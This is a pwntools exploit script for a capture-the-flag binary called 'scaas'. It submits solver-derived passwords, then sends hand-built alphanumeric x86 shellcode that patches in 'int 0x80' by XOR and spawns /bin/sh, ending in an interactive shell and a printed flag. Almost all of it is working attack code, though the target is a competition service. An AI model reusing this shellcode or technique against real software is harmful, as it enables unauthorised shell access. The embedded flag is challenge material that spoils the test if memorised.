
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *
import os
import sys
import shutil
import shlex
import subprocess
import stat

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./src/scaas')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# CALL fgets()
hbreak *scaas+0xbd
command
    set $buffer=*(void**)$sp
    printf "Buffer: %p\\n", $buffer
end

# CALL eax - i.e. invoke our shellcode
hbreak *scaas+0x168

# continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'scaas-1.play.hfsc.tf'
    remote_port = 1337    
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

io.recvuntil(b'> ')

# # Code to download the binary from the remote - for autopwning
# io.sendline(b'1')
# io.recvuntil(b'(\n')
# mydata = b64d(io.recvuntil(b'\n)', drop=True).decode('ascii').strip())
# print(mydata)

# with open('bin_file.gz', 'wb') as f:
#     f.write(mydata)
# subprocess.check_call(shlex.split('gunzip -f bin_file.gz'))
# os.chmod('bin_file', os.stat('bin_file').st_mode | stat.S_IEXEC)
# os.system('~/.pyenv/versions/angr/bin/python solver.py bin_file') # produce solution.txt

with open('solution.txt', 'r') as f:
    solution_input = [l.strip() for l in f.readlines()]

passwords = []
for i in range(3):
    passwords.append([])
    for j in range(5):
        digit = solution_input[i*5 + j]
        passwords[-1].append(digit)
print(passwords)


io.send(b'2\n')

def send_password(password):
    for i, digit in enumerate(password):
        io.recvuntil(f'Enter password {i}: '.encode('utf-8'))
        payload = str(digit).encode('utf-8')
        payload += b'\x00'*(40 - len(payload))
        print('Sending digit:' + digit)
        try:
            io.send(payload)
        except:
            print(io.recvall())
            io.interactive()

for i in range(3):
    io.recvline_startswith(b'Enter passwords for Stage ')
    send_password(passwords[i])
    print(f"Stage {i+1} - passed")

# int 0x80 == b'\xcd\x80'

payload  = b''
payload += asm('''
       //make memory zero to make space for the int 0x80 instruction
       //0x47 is the padding byte that we use
       push 0x47
       pop eax
       xor [ecx+0x41], eax;
       xor [ecx+0x42], eax;
       xor [ecx+0x43], eax;
       xor [ecx+0x44], eax;
       
       //construct int 0x80
       push 0x30
       pop eax
       xor al, 0x30

       //eax is now 0
       dec eax         /* 0xffffffff in EAX */
       xor ax, 0x4f73
       xor ax, 0x3041  /* 0xffff80cd in EAX */
       // push eax        /* put "int 0x80" on the stack */
       xor [ecx+0x41], eax; /* int 0x80 */

       //remaning
       push 0x30
       pop eax
       xor al, 0x30
       push eax
       pop edx
       dec eax
       xor ax, 0x4f73
       xor ax, 0x3041
       push eax
       push edx
       pop eax
       // ;----------------------
       push edx
       push 0x68735858
       pop eax
       xor ax, 0x7777
       push eax
       push 0x30
       pop eax
       xor al, 0x30
       xor eax, 0x6e696230
       dec eax
       push eax

       // ; pushad/popad to place /bin/sh in EBX register
       push esp
       pop eax
       push edx
       push ecx
       push ebx
       push eax
       push esp
       push ebp
       push esi
       push edi
       popad
       push eax
       pop ecx
       push ebx

       //set edx to 0
       push 0x30
       pop eax
       xor al, 0x30
       push eax
       pop edx

       xor al, 0x4a
       xor al, 0x41
''')
for b in payload:
    assert(chr(b).isalnum())

payload += b'\x47'*60
io.send(payload + b'\n') # fgets

io.interactive()
io.close()

# midnight{m0d3rn_cl0ud_sh3llc0de5}
